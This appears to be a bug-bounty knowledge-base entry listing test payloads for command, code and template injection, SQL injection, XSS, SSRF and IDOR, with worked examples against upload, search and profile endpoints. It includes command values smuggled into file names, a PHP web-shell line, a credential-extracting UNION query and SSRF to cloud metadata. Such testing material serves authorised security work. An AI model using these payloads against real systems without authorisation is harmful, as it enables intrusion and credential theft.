# Vulnerability Testing Scenarios

## Overview

- Purpose: Provide specific test scenarios and payloads for high-impact vulnerability types
- Category: vulnerability_assessment
- Severity: high
- Tags: bug-bounty, vulnerability-testing, payloads, test-scenarios

## Context and Use-Cases

- Executing targeted vulnerability tests on discovered endpoints
- Using proven payloads for each vulnerability type
- Automating vulnerability detection with specialized tools
- Validating findings with multiple payload variations

## Procedure / Knowledge detail

### RCE (Remote Code Execution) Testing

**Three Test Scenarios**:

1. **Command Injection**
   - Payloads: `$(whoami)`, `` `id` ``, `;ls -la`
   - Target: Command execution in shell context
   - Tools: nuclei, jaeles, sqlmap

2. **Code Injection**
   - Payloads: `<?php system($_GET['cmd']); ?>`
   - Target: Server-side code execution
   - Tools: nuclei, jaeles

3. **Template Injection**
   - Payloads: `{{7*7}}`, `${7*7}`, `#{7*7}`
   - Target: Template engine evaluation
   - Tools: nuclei, jaeles

### SQLi (SQL Injection) Testing

**Three Test Scenarios**:

1. **Union-based SQLi**
   - Payloads: `' UNION SELECT 1,2,3--`, `' OR 1=1--`
   - Target: Data extraction via UNION queries
   - Detection: Unusual data in response

2. **Boolean-based SQLi**
   - Payloads: `' AND 1=1--`, `' AND 1=2--`
   - Target: True/False response differentiation
   - Detection: Response differences

3. **Time-based SQLi**
   - Payloads: `'; WAITFOR DELAY '00:00:05'--`, `' AND SLEEP(5)--`
   - Target: Time delays in response
   - Detection: Response timing analysis

### XSS (Cross-Site Scripting) Testing

**Three Test Scenarios**:

1. **Reflected XSS**
   - Payloads: `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`
   - Target: Immediate script execution in response
   - Detection: JavaScript execution in browser

2. **Stored XSS**
   - Payloads: `<script>alert('XSS')</script>`
   - Target: Persistent script storage in database
   - Detection: Script execution on page load

3. **DOM XSS**
   - Payloads: `javascript:alert(1)`, `#<script>alert(1)</script>`
   - Target: DOM manipulation via JavaScript
   - Detection: Client-side script execution

### SSRF (Server-Side Request Forgery) Testing

**Three Test Scenarios**:

1. **Internal Network Access**
   - Payloads: `http://127.0.0.1:80`, `http://localhost:22`
   - Target: Access to internal services
   - Detection: Service responses or error messages

2. **Cloud Metadata Access**
   - Payloads: `http://169.254.169.254/latest/meta-data/`
   - Target: AWS/Cloud metadata endpoints
   - Detection: Credential exposure

3. **DNS Exfiltration**
   - Payloads: `http://burpcollaborator.net`
   - Target: Out-of-band data exfiltration
   - Detection: DNS query logs

### IDOR (Insecure Direct Object Reference) Testing

**Three Test Scenarios**:

1. **Numeric IDOR**
   - Payloads: `id=1`, `id=2`, `id=../1`
   - Target: Sequential ID enumeration
   - Detection: Access to other users' data

2. **UUID IDOR**
   - Payloads: `uuid=00000000-0000-0000-0000-000000000001`
   - Target: Predictable UUID patterns
   - Detection: Access to other users' data

3. **Encoded IDOR**
   - Payloads: `id=MQ==`, `id=Mg==` (base64 encoded 1, 2)
   - Target: Encoded ID enumeration
   - Detection: Access to other users' data

## Examples

### Example 1: Testing RCE on File Upload

```
Endpoint: /upload
Parameter: filename

Payloads:
1. filename=$(whoami).jpg
2. filename=`id`.jpg
3. filename=;ls -la;.jpg

Expected: Command output in response or error message
```

### Example 2: Testing SQLi on Search

```
Endpoint: /search
Parameter: q

Payloads:
1. q=' UNION SELECT username, password FROM users--
2. q=' AND 1=1--
3. q=' AND SLEEP(5)--

Expected: Data extraction or time delay
```

### Example 3: Testing IDOR on User Profile

```
Endpoint: /api/user/profile
Parameter: user_id

Payloads:
1. user_id=1 (your own ID)
2. user_id=2 (other user)
3. user_id=999 (non-existent)

Expected: Access to other users' profiles
```

## Related Knowledge Items

- bug_bounty_vulnerability_prioritization - Priority scoring for vulnerabilities
- bug_bounty_reconnaissance_workflow - Endpoint discovery
- vulnerability_assessment - General vulnerability assessment methodology

## Best Practices

1. **Test systematically** - Try all scenarios for each vulnerability type
2. **Use multiple payloads** - Different payloads may bypass filters
3. **Monitor responses** - Look for error messages, timing, or data leakage
4. **Document findings** - Record successful payloads and responses
5. **Verify exploitation** - Confirm vulnerability before reporting
6. **Consider context** - Adapt payloads based on technology stack
7. **Automate where possible** - Use tools for repetitive testing
